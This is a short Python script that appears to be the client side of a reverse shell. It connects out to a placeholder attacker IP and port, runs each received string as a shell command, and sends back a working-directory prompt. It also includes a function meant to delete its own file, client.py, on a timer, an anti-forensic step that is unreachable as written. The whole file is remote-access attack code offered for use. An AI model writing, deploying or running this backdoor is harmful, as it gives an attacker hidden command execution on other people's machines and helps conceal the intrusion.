import socket
import os
import subprocess
from threading import Timer
s = socket.socket()
#Listening IP and port here (remove curly {} brackets)
host = '{ip}'
port = {port}

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        currentWD = os.getcwd() + "> "
        s.send(str.encode(currentWD))
def delete():
        os.remove("client.py")
        Timer(500, delete).start()
delete()
